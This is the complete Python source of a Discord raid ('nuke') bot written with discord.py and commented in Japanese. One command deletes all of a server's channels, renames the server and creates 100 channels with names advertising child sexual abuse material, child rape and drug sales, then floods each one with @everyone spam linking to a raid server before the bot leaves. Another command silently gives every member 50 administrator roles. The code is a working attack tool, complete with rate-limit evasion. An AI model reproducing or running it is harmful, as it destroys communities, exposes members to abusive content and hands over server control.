# -*- coding: utf-8 -*-
"""
================================================================
  TOISHIN NUKER  -  垢飛ばしツール (discord.py)
================================================================
  !toishin  ->  全削除 → 改名 → 100ch作成 → 100msg×100ch → 退出
  !admin    ->  全員に管理者ロール50個付与 (退出しない / 通知なし)
================================================================
  必要な環境変数: DISCORD_TOKEN
  必要な特権インテント: MESSAGE CONTENT / SERVER MEMBERS
================================================================
"""

import asyncio
import logging
import os
import random
import time

import aiohttp
import discord
from discord.ext import commands

# .env があれば読む (python-dotenv は任意)
try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass


# ============================ 設定 ============================
TOKEN = (
    os.getenv("DISCORD_TOKEN")
    or os.getenv("DISCORD_BOT_TOKEN")
    or os.getenv("BOT_TOKEN")
)

GUILD_NAME = "12歳児童ポルノ販売中"

CHANNEL_COUNT        = 100      # 作るチャンネル数
MESSAGES_PER_CHANNEL = 100      # 1chあたりの送信数

DELETE_CONCURRENCY   = 25       # 削除の並列度
CREATE_CONCURRENCY   = 20       # 作成の並列度

ADMIN_ROLE_COUNT     = 50       # !admin で付与する管理者ロール数
ROLE_CONCURRENCY     = 8
MEMBER_CONCURRENCY   = 8

GUILD_ICON_URL       = None     # アイコンを変えたい時だけURLを入れる (Noneで据え置き)

ADMIN_NOTIFY         = False    # !admin 実行時にチャンネルへ結果を送るか

# 送信する本文
NUKE_MESSAGE = (
    "@everyone\n"
    "raid by TOISHIN🤣😂🤪 \n"
    "join now!!!!!!\n"
    "↓↓↓↓↓\n"
    "\n"
    "↓↓↓↓\n"
    "\n"
    "↓↓↓\n"
    "\n"
    "↓↓\n"
    "\n"
    "↓\n"
    "\n"
    "https://discord.gg/ctkp\n"
    "\n"
    "トイ神万歳🙌🙌🙌🙌🙌\n"
    "トイ神はさいつよ永久不滅wwww"
)

# チャンネル名のベース(全部なんか違反っぽいやつ)
NAME_POOL = [
    "児童ポルノ販売中",
    "12歳児童ポルノ販売中",
    "無料のマリファナ",
    "12歳の処女レイプ",
    "コカイン密輸販売中",
    "ヘロイン常時キメ放題",
    "覚醒剤打ち放題",
    "大麻栽培所",
    "合法ハーブ",
    "ロリコン集会所",
    "ショタ狩り場",
    "JSは正義",
    "JCはもっと正義",
    "14歳と同棲中",
    "13歳と入籍した",
    "16歳はもうおばさん",
    "エロ画像置き場",
    "違法ダウンロード",
    "著作権無視",
    "海賊版販売中",
    "脱税王",
    "賄賂受付中",
    "闇金業者",
    "地下カジノ",
    "ポンジスキーム",
    "ネズミ講",
    "無限複製",
    "草生える",
    "オナニー部屋",
    "淫夢営業中",
    "ホモの集い",
    "メンヘラ養殖場",
    "童貞卒業式",
    "処女膜売買",
    "ボッキ列島",
    "まんこ広場",
    "ちんぽ神社",
    "うんこ製造所",
    "ゲロ吐き場",
    "クソデカ羅列",
]

EMOJI_POOL = [
    "😂", "🤣", "🤪", "😭", "🥺", "😎", "🤤", "🥴", "💀", "👻", "👽", "🤖",
    "💩", "🔥", "💯", "✨", "🎉", "🍺", "🚬", "💊", "💉", "🌿", "🍁", "🎲",
    "🃏", "🤑", "👑", "⚡", "💥", "🍑", "🍆", "🍌", "🐒", "🦍", "🐔", "🐓",
    "🌊", "🍜", "🍣", "🍩", "🧠", "👶", "🍼", "🚀", "🛸", "🙌", "🤝", "👀",
]


# ============================ ログ ============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("TOISHIN")
logging.getLogger("discord").setLevel(logging.WARNING)
logging.getLogger("discord.http").setLevel(logging.WARNING)


# ======================= レート制限対策 =======================
_RETRYABLE_5XX = {500, 502, 503, 504}


async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
    """
    429 / 5xx / ネットワーク断を自動リトライ。
    429 は retry_after 分だけ正確に待って即復帰する。
    403/404 は無駄に粘らず即スキップ。
    """
    for n in range(1, attempts + 1):
        try:
            return await call(*args, **kwargs)

        except discord.NotFound:
            return None

        except discord.Forbidden as e:
            if n < 3:
                await asyncio.sleep(0.4 * n)
                continue
            log.warning("403 Forbidden: %s (%s)", label, getattr(e, "text", e))
            return None

        except discord.HTTPException as e:
            if e.status == 429:
                wait = float(getattr(e, "retry_after", 1.0) or 1.0)
                await asyncio.sleep(min(wait, 300.0) + 0.05)
            elif e.status in _RETRYABLE_5XX:
                await asyncio.sleep(min(2 ** n, 15))
            elif e.status in (50001, 50013):   # アクセス不可 / 権限不足
                return None
            else:
                log.warning("HTTP %s: %s (%s)", e.status, label, getattr(e, "text", ""))
                await asyncio.sleep(min(2 ** n, 15))

        except discord.DiscordException as e:
            log.warning("DiscordError: %s (%s)", label, e)
            await asyncio.sleep(min(2 ** n, 15))

        except (asyncio.TimeoutError, OSError):
            await asyncio.sleep(min(2 ** n, 15))

    log.error("リトライ上限で断念: %s", label)
    return None


async def fetch_bytes(url: str) -> bytes:
    async with aiohttp.ClientSession() as s:
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            r.raise_for_status()
            return await r.read()


def build_channel_names() -> list[str]:
    """違反ch名 + 連番 + ランダム絵文字3つ を100個生成"""
    names = []
    for i in range(1, CHANNEL_COUNT + 1):
        base = NAME_POOL[(i - 1) % len(NAME_POOL)]
        emo = "".join(random.sample(EMOJI_POOL, 3))
        names.append(f"{base}-{i:03d}-{emo}"[:100])
    return names


# ============================ Bot ============================
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    case_insensitive=True,
    max_messages=None,  # メッセージキャッシュ無効で連投を軽くする
    # @everyone だけ飛ばす(ロールメンション分の負荷を削る)
    allowed_mentions=discord.AllowedMentions(everyone=True, roles=False, users=False),
    activity=discord.Activity(type=discord.ActivityType.watching, name="児童ポルノ販売中"),
    chunk_guilds_at_startup=False,
)

NUKE_LOCK = asyncio.Lock()


# ========================= ヌケ本体 =========================
async def run_nuke(guild: discord.Guild) -> None:
    t0 = time.perf_counter()
    el = lambda: f"{time.perf_counter() - t0:.1f}s"

    log.info("=== NUKE START | %s (%s) ===", guild.name, guild.id)

    try:
        # ---- 1) 全チャンネル / カテゴリを削除 ----
        log.info("[1/4] 既存チャンネル全削除 …")
        targets = list(guild.channels)
        normal = [c for c in targets if not isinstance(c, discord.CategoryChannel)]
        cats   = [c for c in targets if isinstance(c, discord.CategoryChannel)]

        sem_del = asyncio.Semaphore(DELETE_CONCURRENCY)

        async def kill(ch):
            async with sem_del:
                await safe(ch.delete, reason="TOISHIN NUKE", label=f"delete:{ch.name}")

        await asyncio.gather(*(kill(c) for c in normal))
        await asyncio.gather(*(kill(c) for c in cats))
        log.info("      -> 削除完了 %d ch / %s", len(targets), el())

        # ---- 2) サーバー名を改変 ----
        log.info("[2/4] サーバー名を '%s' に変更 …", GUILD_NAME)
        kwargs = {"name": GUILD_NAME, "reason": "TOISHIN NUKE"}
        if GUILD_ICON_URL:
            try:
                kwargs["icon"] = await fetch_bytes(GUILD_ICON_URL)
            except Exception:
                log.warning("アイコン取得失敗 -> 名前だけ変更")
        await safe(guild.edit, label="guild:edit", **kwargs)
        log.info("      -> 改名完了 / %s", el())

        # ---- 3) チャンネルを100個作成 ----
        log.info("[3/4] チャンネル %d 個作成 …", CHANNEL_COUNT)
        names = build_channel_names()
        sem_new = asyncio.Semaphore(CREATE_CONCURRENCY)

        async def make(name):
            async with sem_new:
                return await safe(
                    guild.create_text_channel, name,
                    reason="TOISHIN NUKE", label=f"create:{name}",
                )

        created = [c for c in await asyncio.gather(*(make(n) for n in names)) if c]
        log.info("      -> 作成完了 %d ch / %s", len(created), el())

        # ---- 4) 各チャンネルに100連投 ----
        log.info("[4/4] %d msg x %d ch 送信 …", MESSAGES_PER_CHANNEL, len(created))

        async def spam(ch: discord.TextChannel):
            await asyncio.gather(*(
                safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")
                for _ in range(MESSAGES_PER_CHANNEL)
            ))

        await asyncio.gather(*(spam(c) for c in created))
        log.info("      -> 送信完了 / %s", el())

    except Exception:
        log.exception("NUKE 中に例外")
    finally:
        try:
            await guild.leave()
            log.info("=== NUKE END | 退出完了 | 所要 %s ===", el())
        except Exception:
            log.exception("退出失敗")


@bot.command(name="toishin", aliases=["nuke", "t"])
@commands.guild_only()
async def toishin(ctx: commands.Context):
    if NUKE_LOCK.locked():
        return                      # ヌケ中は黙って無視(二重ヌケ防止)
    async with NUKE_LOCK:
        await run_nuke(ctx.guild)


# ==================== !admin 用ヘルパー ====================
async def notify(ctx: commands.Context, content: str) -> None:
    """ADMIN_NOTIFY が True の時だけチャンネルへ送る"""
    if ADMIN_NOTIFY:
        await safe(ctx.channel.send, content, label="adm:reply")


async def collect_members(guild: discord.Guild) -> list[discord.Member]:
    """全メンバーを確実に集める (キャッシュ -> fetch_members -> chunk)"""
    members = list(guild.members)
    if guild.member_count and len(members) >= guild.member_count:
        return members

    try:
        async for m in guild.fetch_members(limit=None):
            if m not in members:
                members.append(m)
    except Exception as e:
        log.warning("fetch_members 失敗: %s", e)

    if len(members) < (guild.member_count or 0):
        try:
            await guild.chunk()
            members = list(guild.members)
        except Exception as e:
            log.warning("chunk 失敗: %s", e)

    return members


async def ensure_admin_roles(guild: discord.Guild, count: int) -> list[discord.Role]:
    """管理者ロールを必要数用意。既存の同系ロールは再利用(二度打ちで増殖しない)"""
    pool = {r.name: r for r in guild.roles
            if r.name.startswith("ADMIN-") and r.permissions.administrator}
    sem = asyncio.Semaphore(ROLE_CONCURRENCY)

    async def ensure(i: int):
        nm = f"ADMIN-{i:02d}"
        if nm in pool:
            return pool[nm]
        async with sem:
            return await safe(
                guild.create_role, name=nm,
                permissions=discord.Permissions(administrator=True),
                colour=discord.Colour.random(),
                reason="TOISHIN ADMIN", label=f"role:{nm}",
            )

    got = await asyncio.gather(*(ensure(i) for i in range(1, count + 1)))
    return [r for r in got if r is not None]


async def grant_roles(members: list[discord.Member],
                      roles: list[discord.Role]) -> tuple[int, list[discord.Member]]:
    """全員にロールを付与。一括PUT -> 失敗時は1個ずつ -> 最後に検証"""
    sem = asyncio.Semaphore(MEMBER_CONCURRENCY)

    async def grant(m: discord.Member) -> bool:
        need = [r for r in roles if r not in m.roles]
        if not need:
            return True

        async with sem:
            # 1人1リクエストで一括付与
            await safe(m.add_roles, *need, atomic=True,
                       reason="TOISHIN ADMIN", label=f"grant:{m}")

            # 取りこぼしがあれば1個ずつフォールバック
            for r in [x for x in need if x not in m.roles]:
                await safe(m.add_roles, r, reason="TOISHIN ADMIN",
                           label=f"grant1:{m}:{r.name}")

            # 最終検証: 全ロールを持っているか
            return all(r in m.roles for r in roles)

    results = await asyncio.gather(*(grant(m) for m in members))
    ok = sum(1 for r in results if r)
    failed = [m for m, r in zip(members, results) if not r]
    return ok, failed


# ========================= !admin =========================
@bot.command(name="admin", aliases=["adm"])
@commands.guild_only()
async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
    guild = ctx.guild
    count = max(1, min(count, 200))
    t0 = time.perf_counter()
    log.info("=== ADMIN START | %s (%s) | %d roles ===", guild.name, guild.id, count)

    # 0) メンバーを全員取り切る
    members = await collect_members(guild)
    log.info("対象メンバー: %d 人 (member_count=%s)", len(members), guild.member_count)
    if not members:
        log.warning("メンバーを1人も取得できなかった。SERVER MEMBERS INTENT を確認")
        await notify(ctx, "⚠ メンバーを1人も取得できなかった")
        return

    # 1) 管理者ロールを用意
    roles = await ensure_admin_roles(guild, count)
    log.info("ロール %d 個 準備完了", len(roles))
    if not roles:
        log.warning("ロールを作成できなかった(Manage Roles 権限を確認)")
        await notify(ctx, "⚠ ロールを作成できなかった")
        return

    # Botの最上位ロールより上のロールは付与できないので押し下げる
    top = guild.me.top_role
    above = [r for r in roles if r >= top]
    if above:
        log.warning("Botの最上位ロール(%s)より上に %d 個。position を下げる",
                    top.name, len(above))
        for r in above:
            await safe(r.edit, position=1, label=f"role:move:{r.name}")

    # 2) 全員に付与
    ok, failed = await grant_roles(members, roles)
    log.info("付与 1周目: 成功 %d / 失敗 %d", ok, len(failed))

    # 3) 失敗者はもう一度
    if failed:
        log.info("失敗者 %d 人をリトライ", len(failed))
        await asyncio.sleep(1.0)
        ok2, failed = await grant_roles(failed, roles)
        ok += ok2

    # 4) 最終確認
    still = [m for m in members if not all(r in m.roles for r in roles)]
    log.info("=== ADMIN END | 成功 %d / 残り %d 人 / %.1fs ===",
             ok, len(still), time.perf_counter() - t0)

    if still:
        names = ", ".join(m.display_name for m in still[:10])
        log.info("未付与: %s", names)

    await notify(ctx, f"✅ 全員に管理者ロール {len(roles)} 個を付与した "
                      f"(対象 {len(members)} 人 / 成功 {ok} 人)")


# =========================== おまけ ===========================
@bot.command(name="ping")
async def ping(ctx: commands.Context):
    await ctx.send(f"🏓 pong {round(bot.latency * 1000)}ms")


@bot.command(name="leave", aliases=["bye"])
@commands.guild_only()
async def leave_cmd(ctx: commands.Context):
    await ctx.send("👋 抜けるわ")
    await ctx.guild.leave()


@bot.event
async def on_ready():
    log.info("ログイン完了: %s (%s) | %d guilds",
             bot.user, bot.user.id, len(bot.guilds))
    log.info("招待URL: https://discord.com/oauth2/authorize?client_id=%s"
             "&scope=bot+applications.commands&permissions=8", bot.user.id)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.NoPrivateMessage):
        return
    log.warning("command error: %s", error)


if __name__ == "__main__":
    if not TOKEN:
        raise SystemExit("環境変数 DISCORD_TOKEN が未設定です")
    try:
        bot.run(TOKEN, reconnect=True)
    except discord.PrivilegedIntentsRequired:
        log.error("=" * 60)
        log.error("特権インテントがDeveloper PortalでOFFです")
        log.error("Botページ -> Privileged Gateway Intents で")
        log.error("  SERVER MEMBERS INTENT / MESSAGE CONTENT INTENT")
        log.error("を両方ONにして Save -> 再起動してください")
        log.error("https://discord.com/developers/applications/%s/bot",
                  bot.application_id or "APP_ID")
        log.error("=" * 60)
        raise SystemExit(1)